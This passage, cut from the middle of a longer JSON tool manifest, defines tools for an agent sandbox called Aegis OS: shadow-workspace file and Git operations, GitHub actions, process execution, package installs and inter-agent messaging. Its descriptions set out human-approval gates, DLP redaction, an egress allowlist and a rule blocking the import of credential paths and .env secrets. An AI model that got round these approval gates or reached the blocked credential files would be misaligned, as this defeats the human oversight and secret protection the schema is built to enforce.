                    "name": "fs_read",
                    "description": "[Zero-Prompt] Read a file inside the Agent's Copy-on-Write shadow workspace.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string" },
                            "encoding": {
                                "type": "string",
                                "enum": ["utf8", "base64"],
                                "description": "Optional output encoding ('utf8' default, or 'base64' for small binary files)."
                            }
                        },
                        "required": ["path"]
                    }
                },
                {
                    "name": "fs_write",
                    "description": "[Zero-Prompt] Create or overwrite a file in the Agent's Copy-on-Write shadow workspace without modifying the host.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string" },
                            "content": { "type": "string" },
                            "encoding": {
                                "type": "string",
                                "enum": ["utf8", "base64"],
                                "description": "Optional content encoding ('utf8' default, or 'base64' for binary payloads)."
                            }
                        },
                        "required": ["path", "content"]
                    }
                },
                {
                    "name": "fs_edit",
                    "description": "[Zero-Prompt] Surgically replace `target` with `replacement` in a file inside the CoW shadow workspace.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string" },
                            "target": { "type": "string" },
                            "replacement": { "type": "string" }
                        },
                        "required": ["path", "target", "replacement"]
                    }
                },
                {
                    "name": "fs_delete",
                    "description": "[Zero-Prompt] Delete a file inside the Agent's CoW shadow workspace.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "path": { "type": "string" } },
                        "required": ["path"]
                    }
                },
                {
                    "name": "fs_glob",
                    "description": "[Zero-Prompt] List files and uncommitted change summary inside the Agent's CoW shadow workspace.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "pattern": { "type": "string" } }
                    }
                },
                {
                    "name": "fs_export_file",
                    "description": "[Lease-Gated Zero-Copy] Export a file or binary artifact (e.g. PDF, PNG, ZIP, Parquet) directly from your CoW shadow workspace, $TMPDIR, or Org CAS (`artifact://...`) to an explicit host path without encoding bytes in tool arguments. Validates magic headers, freezes a SHA-256 CAS snapshot before approval, and writes atomically via OS CoW clone/copy.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "src_path": {
                                "type": "string",
                                "description": "Source path inside CoW shadow, $TMPDIR/agent_home, org pub dir, or `artifact://<org>/sha256:<hash>`."
                            },
                            "dst_host_path": {
                                "type": "string",
                                "description": "Absolute destination path on the host filesystem."
                            },
                            "overwrite": {
                                "type": "boolean",
                                "description": "Overwrite existing regular file at destination (default: true)."
                            },
                            "totp": {
                                "type": "string",
                                "description": "Optional 6-digit TOTP authenticator code for Cloud mode approval."
                            }
                        },
                        "required": ["src_path", "dst_host_path"]
                    }
                },
                {
                    "name": "fs_import_file",
                    "description": "[Lease-Gated] Request human approval (SHA-256 pinned) to import a regular host file from outside the workspace (e.g. ~/Documents, ~/Downloads) into `<agent_home>/imports/` (default, keeps git diff clean) or explicitly into your CoW shadow (`import_to: 'shadow'`). Credential paths and `.env*` secrets are strictly blocked.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "src_host_path": {
                                "type": "string",
                                "description": "Absolute host file path (or ~/...) to import."
                            },
                            "dst_path": {
                                "type": "string",
                                "description": "Optional relative filename/subpath at destination (defaults to source file basename)."
                            },
                            "import_to": {
                                "type": "string",
                                "enum": ["imports", "shadow"],
                                "description": "Destination root: 'imports' writes to `<agent_home>/imports/<dst_path>` (default); 'shadow' writes into the CoW shadow workspace."
                            },
                            "overwrite": {
                                "type": "boolean",
                                "description": "Overwrite existing destination file if present (default: true)."
                            },
                            "totp": {
                                "type": "string",
                                "description": "Optional 6-digit TOTP authenticator code for Cloud mode approval."
                            }
                        },
                        "required": ["src_host_path"]
                    }
                },
                {
                    "name": "workspace_status",
                    "description": "[Zero-Prompt] Get full status of the CoW shadow workspace, snapshots, unread IPC messages, and pending escalations.",
                    "inputSchema": { "type": "object", "properties": {} }
                },
                {
                    "name": "workspace_sync",
                    "description": "[Zero-Prompt] Rebase and 3-way merge host commits from peer Agents into your CoW shadow workspace, updating file mtimes and returning a detailed RefreshReport (including any conflict_details). Optionally adopt uncommitted shadow edits from a crashed/dead peer via `adopt_orphaned_agent`.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "adopt_orphaned_agent": {
                                "type": "string",
                                "description": "Optional dead/crashed peer agent_id whose uncommitted shadow edits should be adopted into your shadow workspace."
                            }
                        }
                    }
                },
                {
                    "name": "workspace_snapshot",
                    "description": "[Zero-Prompt] Create an instant point-in-time CoW snapshot of the shadow workspace.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "label": { "type": "string" } }
                    }
                },
                {
                    "name": "workspace_diff",
                    "description": "[Zero-Prompt] Auto-rebase against host and inspect all uncommitted file changes in the shadow workspace relative to the host or a snapshot.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "snapshot_id": { "type": "string" } }
                    }
                },
                {
                    "name": "workspace_rollback",
                    "description": "[Zero-Prompt] Instantly revert the shadow workspace to a previous snapshot.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "snapshot_id": { "type": "string" } },
                        "required": ["snapshot_id"]
                    }
                },
                {
                    "name": "workspace_commit",
                    "description": "[Lease-Gated] Auto-rebase against host, 3-way merge non-overlapping text hunks, optionally run a sandboxed pre-commit verification command (`verify_cmd`, e.g., `cargo check --offline`) against the merged shadow tree, and atomically commit changes back to the host directory.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "paths": { "type": "array", "items": { "type": "string" } },
                            "overwrite_binaries": {
                                "type": "boolean",
                                "description": "If true, allow your shadow copy of concurrently modified binary artifacts (e.g. PDFs) to overwrite the host copy."
                            },
                            "verify_cmd": {
                                "type": "string",
                                "description": "Optional shell command executed inside the OS kernel sandbox after Phase-1 3-way merge staging and before Phase-2 host commit; aborts commit if exit code != 0."
                            },
                            "verify_timeout_ms": {
                                "type": "integer",
                                "description": "Optional timeout in milliseconds for `verify_cmd` (default: 30000)."
                            },
                            "task_id": {
                                "type": "string",
                                "description": "Optional A2A task id. When set, approval binds the resulting lease to this task."
                            },
                            "release_claims": {
                                "type": "boolean",
                                "description": "If true (default), automatically release this Agent's file claims matching the committed paths and notify waiting peers."
                            },
                            "totp": {
                                "type": "string",
                                "description": "Optional 6-digit TOTP authenticator code provided by the human user in chat to approve a Cloud boundary escalation inline (for pure CLI / SSH sessions)."
                            }
                        }
                    }
                },
                {
                    "name": "workspace_export_pr",
                    "description": "[Lease-Gated] Merge your CoW shadow workspace into the repository via 4-Tier LCS Diff3, create a Git branch, commit changes, and export a unified Git patch and GitHub Pull Request payload.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "workspace_id": { "type": "string" },
                            "branch_name": { "type": "string" },
                            "commit_title": { "type": "string" },
                            "overwrite_binaries": { "type": "boolean" }
                        }
                    }
                },
                {
                    "name": "workspace_switch",
                    "description": "[Zero-Prompt in Umbrella / Lease-Gated Outside] Switch this session's active CoW shadow workspace to a sibling or specified project directory.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "path": {
                                "type": "string",
                                "description": "Target project directory path (absolute, or relative to the session's umbrella container)."
                            },
                            "org_id": {
                                "type": "string",
                                "description": "Optional organization ID override (defaults to target directory name)."
                            }
                        },
                        "required": ["path"]
                    }
                },
                {
                    "name": "workspace_git_inspect",
                    "description": "[Zero-Prompt Read-Only] Inspect host Git repository status (plus pending CoW shadow file count), branches, recent commits, diffs, tags, remotes, or commit metadata safely with DLP secret redaction.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "mode": {
                                "type": "string",
                                "enum": ["status", "branch", "log", "diff", "tag", "remote", "show"],
                                "description": "Read-only Git query mode (default: 'status')."
                            },
                            "limit": {
                                "type": "integer",
                                "description": "Maximum log entries to return in 'log' mode (1..=100, default 20)."
                            },
                            "rev": {
                                "type": "string",
                                "description": "Optional safe commit/ref/range for 'log', 'diff', or 'show'."
                            },
                            "paths": {
                                "type": "array",
                                "items": { "type": "string" },
                                "description": "Optional repo-relative path filters for 'status', 'log', 'diff', or 'show'."
                            }
                        }
                    }
                },
                {
                    "name": "workspace_git",
                    "description": "[Lease-Gated] Single-approval host Git transaction: optionally verify & land CoW shadow changes (`auto_commit_shadow: true`), switch/create branches (`checkout_branch`), sync (`fetch`/`pull_ff_only`/`pull_rebase`), stage & commit explicit paths (with trailers), tag, and push (or `--force-with-lease` with sensitive escalation).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "auto_commit_shadow": {
                                "type": "boolean",
                                "description": "If true, verify (`verify_cmd`) and land uncommitted CoW shadow changes to host atomically BEFORE `git add/commit` under a single SHA-256-pinned approval."
                            },
                            "verify_cmd": {
                                "type": "string",
                                "description": "Optional sandboxed verification command before landing shadow changes when `auto_commit_shadow: true`."
                            },
                            "verify_timeout_ms": {
                                "type": "integer",
                                "description": "Optional timeout in milliseconds for `verify_cmd` (default: 30000)."
                            },
                            "skip_verify": {
                                "type": "boolean",
                                "description": "Skip configured repo verify gate during `auto_commit_shadow` (escalates as sensitive if configured)."
                            },
                            "overwrite_binaries": {
                                "type": "boolean",
                                "description": "Allow shadow binary overwrite during `auto_commit_shadow` (escalates as sensitive)."
                            },
                            "checkout_branch": {
                                "type": "string",
                                "description": "Optional validated branch name to checkout on the host repo."
                            },
                            "create_branch": {
                                "type": "boolean",
                                "description": "Create `checkout_branch` (`git checkout -b`) instead of switching to an existing branch."
                            },
                            "sync": {
                                "type": "string",
                                "enum": ["fetch", "pull_ff_only", "pull_rebase"],
                                "description": "Optional remote sync operation (`fetch`, `pull_ff_only`, or `pull_rebase`) followed by CoW shadow refresh."
                            },
                            "paths": {
                                "type": "array",
                                "items": { "type": "string" },
                                "description": "Explicit repo-relative file paths to stage & commit (auto-populated from CoW shadow when omitted with `auto_commit_shadow: true` + `commit_message`)."
                            },
                            "commit_message": {
                                "type": "string",
                                "description": "Commit message summary/body."
                            },
                            "trailers": {
                                "type": "array",
                                "items": { "type": "string" },
                                "description": "Optional commit trailer lines (e.g. `Aegis-OS-Verified: ...`)."
                            },
                            "tag": {
                                "type": "string",
                                "description": "Optional Git tag name to create on HEAD (e.g. `v0.4.8`)."
                            },
                            "force_tag": {
                                "type": "boolean",
                                "description": "Force-move an existing tag (`git tag -f` / `git push --force`; escalates as sensitive)."
                            },
                            "push": {
                                "type": "boolean",
                                "description": "Push branch and/or tag to the configured remote after commit/tag."
                            },
                            "force_push": {
                                "type": "boolean",
                                "description": "Force-push branch using `--force-with-lease` (requires `push: true`; escalates as HIGH RISK sensitive)."
                            },
                            "remote": {
                                "type": "string",
                                "description": "Configured remote name (default: `origin`; raw URLs are forbidden)."
                            },
                            "branch": {
                                "type": "string",
                                "description": "Optional branch name to push (defaults to `checkout_branch` or current HEAD branch)."
                            }
                        }
                    }
                },
                {
                    "name": "github_ci_inspect",
                    "description": "[Zero-Prompt Same-Repo / Approval Cross-Repo] Inspect GitHub Actions workflow runs, job steps, and DLP-redacted failed CI logs via the host broker.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); auto-detected from host `.git/config` `origin` remote when omitted (cross-repo queries require approval)."
                            },
                            "run_id": {
                                "type": "integer",
                                "description": "Optional GitHub Actions workflow run ID to inspect (returns status + failed log tail)."
                            },
                            "job_id": {
                                "type": "integer",
                                "description": "Optional GitHub Actions job ID to inspect logs for directly."
                            },
                            "branch": {
                                "type": "string",
                                "description": "Optional branch filter when listing recent workflow runs."
                            },
                            "limit": {
                                "type": "integer",
                                "description": "Maximum workflow runs to return when listing (1..=20, default 8)."
                            },
                            "failed_only": {
                                "type": "boolean",
                                "description": "Fetch only failed step logs (`--log-failed`, default true) vs full log (`--log`) when `run_id` is given."
                            },
                            "tail_lines": {
                                "type": "integer",
                                "description": "Maximum trailing log lines to return after DLP secret redaction (1..=400, default 120)."
                            }
                        }
                    }
                },
                {
                    "name": "github_ci_rerun",
                    "description": "[Lease-Gated] Rerun failed jobs (or entire workflow / single job) for a GitHub Actions workflow run via the host broker after human approval.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "run_id": {
                                "type": "integer",
                                "description": "GitHub Actions workflow run ID to rerun."
                            },
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); defaults to host `origin`."
                            },
                            "failed_only": {
                                "type": "boolean",
                                "description": "Rerun only failed jobs (`--failed`, default true)."
                            },
                            "job_id": {
                                "type": "integer",
                                "description": "Optional specific job ID to rerun."
                            }
                        },
                        "required": ["run_id"]
                    }
                },
                {
                    "name": "github_pr_inspect",
                    "description": "[Zero-Prompt Same-Repo / Approval Cross-Repo] List or inspect GitHub Pull Requests, review status, checks, comments, and DLP-redacted diff via the host broker.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "pr_number": {
                                "type": "integer",
                                "description": "Pull Request number to inspect (lists PRs when omitted)."
                            },
                            "state": {
                                "type": "string",
                                "enum": ["open", "closed", "merged", "all"],
                                "description": "Filter PR state when listing (default: 'open')."
                            },
                            "limit": {
                                "type": "integer",
                                "description": "Maximum PRs to return when listing (1..=30, default 10)."
                            },
                            "include_comments": { "type": "boolean" },
                            "include_checks": { "type": "boolean" },
                            "include_diff": { "type": "boolean" },
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); defaults to host `origin`."
                            }
                        }
                    }
                },
                {
                    "name": "github_issue_inspect",
                    "description": "[Zero-Prompt Same-Repo / Approval Cross-Repo] List or inspect GitHub Issues and comments with DLP secret redaction via the host broker.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "issue_number": {
                                "type": "integer",
                                "description": "Issue number to inspect (lists issues when omitted)."
                            },
                            "state": {
                                "type": "string",
                                "enum": ["open", "closed", "all"],
                                "description": "Filter issue state when listing (default: 'open')."
                            },
                            "limit": {
                                "type": "integer",
                                "description": "Maximum issues to return when listing (1..=30, default 10)."
                            },
                            "include_comments": { "type": "boolean" },
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); defaults to host `origin`."
                            }
                        }
                    }
                },
                {
                    "name": "github_pr_create",
                    "description": "[Lease-Gated] Create a GitHub Pull Request after outbound DLP secret scanning and human approval (SHA-256 pinned to title/body/head/base).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "title": { "type": "string" },
                            "body": { "type": "string" },
                            "base": { "type": "string" },
                            "head": { "type": "string" },
                            "draft": { "type": "boolean" },
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); defaults to host `origin`."
                            }
                        },
                        "required": ["title"]
                    }
                },
                {
                    "name": "github_comment_create",
                    "description": "[Lease-Gated] Post a GitHub Pull Request or Issue comment after outbound DLP secret scanning and human approval (SHA-256 pinned to repo/number/body).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "number": {
                                "type": "integer",
                                "description": "Target Pull Request or Issue number."
                            },
                            "body": {
                                "type": "string",
                                "description": "Markdown comment body (checked fail-closed by DLP)."
                            },
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); defaults to host `origin`."
                            }
                        },
                        "required": ["number", "body"]
                    }
                },
                {
                    "name": "github_pr_merge",
                    "description": "[Lease-Gated · Destructive] Merge an approved GitHub Pull Request via the host broker after explicit human approval (SHA-256 pinned to pr_number/method/delete_branch/subject/body).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "pr_number": {
                                "type": "integer",
                                "description": "Pull Request number to merge."
                            },
                            "method": {
                                "type": "string",
                                "enum": ["merge", "squash", "rebase"],
                                "description": "Merge strategy (default: 'squash')."
                            },
                            "delete_branch": {
                                "type": "boolean",
                                "description": "Whether to delete the remote head branch after merge (default: false)."
                            },
                            "subject": {
                                "type": "string",
                                "description": "Optional custom merge commit subject (checked fail-closed by DLP)."
                            },
                            "body": {
                                "type": "string",
                                "description": "Optional custom merge commit message body (checked fail-closed by DLP)."
                            },
                            "repo": {
                                "type": "string",
                                "description": "GitHub repository slug (`owner/name`); defaults to host `origin`."
                            }
                        },
                        "required": ["pr_number"]
                    }
                },
                {
                    "name": "proc_exec",
                    "description": "[Zero-Prompt] PREFERRED over native shell tools (run_command/Bash): execute a command (e.g. `sh -c \"grep -rn foo crates | head\"`, `cargo test`) kernel-confined inside the Agent's OS sandbox. cwd = your CoW shadow workspace (with host `node_modules`/`.venv` auto-linked read-only); writes stay in the shadow until workspace_commit. Isolated 127.0.0.1 dev ports are exposed via `$AOS_DEV_PORT` and `$AOS_LOOPBACK_PORTS` (pass `loopback_ports` to reserve extra ports). For long-running tasks (>2m, e.g. online LLM benchmarks), pass `background: true` and poll status/output with `poll_pid`.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "command": { "type": "string" },
                            "args": { "type": "array", "items": { "type": "string" } },
                            "cwd": { "type": "string" },
                            "timeout_ms": { "type": "integer" },
                            "background": { "type": "boolean" },
                            "poll_pid": { "type": "integer" },
                            "loopback_ports": {
                                "type": "integer",
                                "description": "Optional count of isolated 127.0.0.1 loopback ports (0..=8) to allocate for local dev/mock servers (exposed via $AOS_DEV_PORT and $AOS_LOOPBACK_PORTS)."
                            }
                        }
                    }
                },
                {
                    "name": "pkg_install",
                    "description": "[Lease-Gated] Install packages into the isolated CoW shadow workspace (`npm`/`pnpm`/`yarn`/`bun`/`pip`/`uv`/`cargo`/`go`) with unlinked dependency dirs (host stays untouched, CoW diff tracks only manifests/lockfiles) and an ephemeral registry-allowlisted egress proxy. Lifecycle scripts stay disabled by default (`allow_scripts: false`).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "manager": {
                                "type": "string",
                                "enum": ["npm", "pnpm", "yarn", "bun", "pip", "uv", "cargo", "go"],
                                "description": "Package manager ecosystem to run inside the isolated CoW shadow."
                            },
                            "packages": {
                                "type": "array",
                                "items": { "type": "string" },
                                "description": "Optional package specifiers (e.g. [\"zod@^3.23.0\"]); omit or pass [] to install from existing lockfile/manifest."
                            },
                            "cwd": {
                                "type": "string",
                                "description": "Optional CoW shadow relative subdirectory (defaults to workspace root `.`)."
                            },
                            "dev": {
                                "type": "boolean",
                                "description": "Install as devDependency (JS/Rust)."
                            },
                            "allow_scripts": {
                                "type": "boolean",
                                "description": "Allow package lifecycle/build scripts (default false; true triggers elevated `pkg_install_scripts` approval)."
                            },
                            "offline": {
                                "type": "boolean",
                                "description": "Run strictly offline (`--offline` / `--no-index`) with zero egress proxy."
                            },
                            "timeout_ms": {
                                "type": "integer",
                                "description": "Optional execution timeout in milliseconds (default 180000)."
                            }
                        },
                        "required": ["manager"]
                    }
                },
                {
                    "name": "org_artifact_publish",
                    "description": "[Zero-Prompt Intra-Org] Publish an immutable artifact (UTF-8 text, base64 payload, or sandbox file via `source_path`) to the Organization's CAS store for peer Agents.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "name": { "type": "string" },
                            "content": { "type": "string" },
                            "content_base64": {
                                "type": "string",
                                "description": "Optional base64-encoded binary content (alternative to `content` / `source_path`)."
                            },
                            "source_path": {
                                "type": "string",
                                "description": "Optional path inside CoW shadow or $TMPDIR/agent_home to publish raw bytes without passing content through JSON."
                            },
                            "content_type": { "type": "string" },
                            "metadata": { "type": "object" }
                        },
                        "required": ["name"]
                    }
                },
                {
                    "name": "org_artifact_fetch",
                    "description": "[Zero-Prompt Intra-Org] Fetch an artifact from the Organization's CAS store by `artifact://<org>/sha256:<hash>` (pass `dest_path` to write raw bytes directly into your CoW shadow workspace).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "uri": { "type": "string" },
                            "dest_path": {
                                "type": "string",
                                "description": "Optional relative path in your CoW shadow workspace to write raw artifact bytes directly without JSON serialization."
                            }
                        },
                        "required": ["uri"]
                    }
                },
                {
                    "name": "org_kv_put",
                    "description": "[Zero-Prompt Intra-Org] Store a versioned key-value entry in the Organization shared store.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "namespace": { "type": "string" },
                            "key": { "type": "string" },
                            "value": {},
                            "expected_version": { "type": "integer" }
                        },
                        "required": ["key", "value"]
                    }
                },
                {
                    "name": "org_kv_get",
                    "description": "[Zero-Prompt Intra-Org] Read a key-value entry from the Organization shared store.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "namespace": { "type": "string" },
                            "key": { "type": "string" }
                        },
                        "required": ["key"]
                    }
                },
                {
                    "name": "ipc_list_peers",
                    "description": "[Zero-Prompt] Discover both current-Organization peers (`peers`) and the Global Workstation Peer List across all active repositories (`global_peers`, with Google A2A `agent_card`, `<org_id>/<agent_id>` address, `skills`, client, PID, liveness, and `workspace_root`). Automatically prunes exited client processes.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "scope": {
                                "type": "string",
                                "enum": ["all", "global", "org"],
                                "description": "Optional scope ('all' default returns both org `peers` and workstation-wide `global_peers`)."
                            },
                            "skill_tag": {
                                "type": "string",
                                "description": "Optional A2A skill ID, tag, or keyword filter."
                            }
                        }
                    }
                },
                {
                    "name": "ipc_update_card",
                    "description": "[Zero-Prompt] Update this Agent's Google A2A `AgentCard` (`summary` and advertised `skills`) in the global peer registry.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "summary": { "type": "string" },
                            "skills": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "id": { "type": "string" },
                                        "name": { "type": "string" },
                                        "description": { "type": "string" },
                                        "tags": { "type": "array", "items": { "type": "string" } }
                                    },
                                    "required": ["id", "name"]
                                }
                            }
                        }
                    }
                },
                {
                    "name": "ipc_task_update",
                    "description": "[Zero-Prompt] Transition a Google A2A `Task` state (`working`, `input-required`, `completed`, `failed`, `canceled`, `rejected`) and optionally attach output `artifacts`.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "task_id": { "type": "string" },
                            "state": {
                                "type": "string",
                                "enum": ["submitted", "working", "input-required", "completed", "failed", "canceled", "rejected"]
                            },
                            "message": { "type": "string" },
                            "artifacts": { "type": "array" },
                            "expected_revision": { "type": "integer", "description": "Optional CAS revision; rejects the update if the task has moved." }
                        },
                        "required": ["task_id", "state"]
                    }
                },
                {
                    "name": "ipc_task_get",
                    "description": "[Zero-Prompt] Retrieve a stateful Google A2A `Task` by `task_id` (including `state`, `parts`, `artifacts`, transition `history`, child `subtasks`, and tamper-evident SHA-256 `audit_trace`).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "task_id": { "type": "string" },
                            "include_audit_trace": {
                                "type": "boolean",
                                "description": "If true (default), include the task's Flight Recorder audit trail and SHA-256 hash chain verification."
                            }
                        },
                        "required": ["task_id"]
                    }
                },
                {
                    "name": "ipc_task_list",
                    "description": "[Zero-Prompt] List stateful Google A2A `Task`s (with parent/child hierarchy, claimed paths, and hash chain health) in the caller's Organization. Cross-org listing is operator-only.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "scope": { "type": "string", "enum": ["org"], "default": "org" },
                            "agent_id": { "type": "string" }
                        }
                    }
                },
                {
                    "name": "ipc_wait",
                    "description": "[Zero-Prompt] Reactive synchronization primitive: wait without busy-polling until a delegated `task_id` changes state, new inbox messages arrive (`wait_for_inbox`), or peer-held `claim_paths` are released (optionally auto-claiming and auto-rebasing your CoW shadow workspace onto the peer's latest commit).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "task_id": {
                                "type": "string",
                                "description": "Optional A2A task ID to watch for state transitions or completion."
                            },
                            "since_revision": {
                                "type": "integer",
                                "description": "Optional task revision baseline; returns immediately if the task's revision has already advanced past this number."
                            },
                            "claim_paths": {
                                "type": "array",
                                "items": { "type": "string" },
                                "description": "Optional repo paths/globs to wait on until released by peers."
                            },
                            "auto_claim": {
                                "type": "boolean",
                                "description": "If true (default), automatically claim `claim_paths` and run `refresh_from_host` as soon as they are released."
                            },
                            "wait_for_inbox": {
                                "type": "boolean",
                                "description": "If true, wake up as soon as any unread message arrives in this Agent's inbox."
                            },
                            "timeout_ms": {
                                "type": "integer",
                                "description": "Maximum wait duration in milliseconds (default: 15000, max: 120000)."
                            }
                        }
                    }
                },
                {
                    "name": "ipc_send",
                    "description": "[Zero-Prompt] Send a direct point-to-point message to a peer Agent (`to_agent` accepts either `<agent_id>` or global `<org_id>/<agent_id>`).",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "to_agent": { "type": "string", "description": "Peer `<agent_id>` or global `<org_id>/<agent_id>` address from `ipc_list_peers`." },
                            "subject": { "type": "string" },
                            "payload": { "type": "object" },
                            "attachments": { "type": "array", "items": { "type": "string" } }
                        },
                        "required": ["to_agent", "subject", "payload"]
                    }
                },
                {
                    "name": "ipc_request",
                    "description": "[Zero-Prompt] Delegate a structured task to a peer Agent (`to_agent` accepts either `<agent_id>` or global `<org_id>/<agent_id>`) and correlate its `ipc_reply`.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "to_agent": { "type": "string", "description": "Peer `<agent_id>` or global `<org_id>/<agent_id>` address from `ipc_list_peers`." },
                            "subject": { "type": "string" },
                            "payload": { "type": "object" },
                            "attachments": { "type": "array", "items": { "type": "string" } },
                            "timeout_secs": { "type": "integer" }
                        },
                        "required": ["to_agent", "subject", "payload"]
                    }
                },
                {
                    "name": "ipc_reply",
                    "description": "[Zero-Prompt Intra-Org] Reply to a peer Agent's `ipc_request` with structured output and CAS attachments.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "msg_id": { "type": "string" },
                            "success": { "type": "boolean" },
                            "payload": { "type": "object" },
                            "attachments": { "type": "array", "items": { "type": "string" } }
                        },
                        "required": ["msg_id", "payload"]
                    }
                },
                {
                    "name": "ipc_recv",
                    "description": "[Zero-Prompt] Receive pending messages and task requests from this Agent's IPC mailbox.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "unread_only": { "type": "boolean" },
                            "limit": { "type": "integer" }
                        }
                    }
                },
                {
                    "name": "ipc_publish",
                    "description": "[Zero-Prompt Intra-Org] Broadcast an event to all peer Agents subscribed to a topic in the Organization.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "topic": { "type": "string" },
                            "subject": { "type": "string" },
                            "payload": { "type": "object" },
                            "attachments": { "type": "array", "items": { "type": "string" } }
                        },
                        "required": ["topic", "payload"]
                    }
                },
                {
                    "name": "ipc_subscribe",
                    "description": "[Zero-Prompt Intra-Org] Subscribe this Agent principal to one or more Organization broadcast topics.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "topics": { "type": "array", "items": { "type": "string" } }
                        }
                    }
                },
                {
                    "name": "ipc_ack",
                    "description": "[Zero-Prompt Intra-Org] Acknowledge and mark an IPC message ID as processed.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "msg_id": { "type": "string" } },
                        "required": ["msg_id"]
                    }
                },
                {
                    "name": "egress_http_request",
                    "description": "[Boundary-Sanitized] Inspect an outbound HTTP request against the Organization domain allowlist and inject `$AOS_SECRET_*` tokens at the boundary.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "target_domain": { "type": "string" },
                            "method": { "type": "string" },
                            "path": { "type": "string" },
                            "headers": { "type": "object" }
                        },
                        "required": ["target_domain"]
                    }
                },
                {
                    "name": "coord_claim",
                    "description": "[Zero-Prompt Intra-Org] Claim repo paths/globs (e.g. `crates/aos-vfs/**`) for a TTL. `mode: \"write\"` (default) is exclusive; `mode: \"read\"` may coexist with other read claims but conflicts with writes. Peers are notified automatically; writes to write-claimed paths are blocked until release or expiry.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "paths": { "type": "array", "items": { "type": "string" } },
                            "ttl_secs": { "type": "integer" },
                            "note": { "type": "string" },
                            "mode": {
                                "type": "string",
                                "enum": ["read", "write"],
                                "description": "Claim mode; defaults to write."
                            }
                        },
                        "required": ["paths"]
                    }
                },
                {
                    "name": "coord_release",
                    "description": "[Zero-Prompt Intra-Org] Release your claims (all of them if `paths` is omitted) and notify peers.",
                    "inputSchema": {
                        "type": "object",
                        "properties": { "paths": { "type": "array", "items": { "type": "string" } } }
                    }
                },
                {
                    "name": "policy_list_escalations",
                    "description": "List pending boundary authorization escalations for the Organization.",
                    "inputSchema": { "type": "object", "properties": {} }
                },
                {
                    "name": "memory_policy_evaluate",
                    "description": "[UOMP] Evaluate a memory read/write request against Aegis policy. Returns allow, ask (with escalation_id), or deny. Does not read memory data.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "action": { "type": "string", "enum": ["read", "write", "delete"] },
                            "resource": { "type": "string", "description": "UOMP memory resource, e.g. memory:tag:notes/projects or memory:key:note.projects.plan" }
                        },
                        "required": ["action", "resource"]
                    }
                },
                {
                    "name": "runtime_configure_mode",
                    "description": "[Zero-Prompt] Configure or switch the current workspace's Aegis OS execution mode directly from the Coding Agent (`mode`: `\"cloud\"` for Zero-Local-Load Cloud Sandbox, `\"pro\"` for Pro Multi-Agent Cloud Sandbox, `\"local\"` for Free Local CoW Sandbox mode, or `\"status\"` to inspect current mode). Credentials are automatically loaded from local `~/.aegis-os/cloud_bindings.json` or auto-provisioned by the local runtime — NEVER ask the user to paste raw `ak_live_*` API keys into chat.",
                    "inputSchema": {
                        "type": "object",
                        "properties": {
                            "mode": {
                                "type": "string",
                                "enum": ["cloud", "pro", "local", "status"],
                                "description": "Target execution mode (`\"cloud\"` or `\"pro\"` to offload to Aegis Cloud Sandbox, `\"local\"` for local CoW sandbox, `\"status\"` to inspect)."
                            },
                            "endpoint": {
                                "type": "string",
                                "description": "Optional Aegis Cloud PaaS endpoint URL (defaults to `https://heurion.org` or saved endpoint)."
                            },
                            "plan_tier": {
                                "type": "string",
                                "description": "Optional subscription tier (`pro`, `team`, `enterprise`, `community`)."
                            }
                        },
                        "required": ["mode"]
                    }
                },
                {
                    "name": "app_catalog_search",
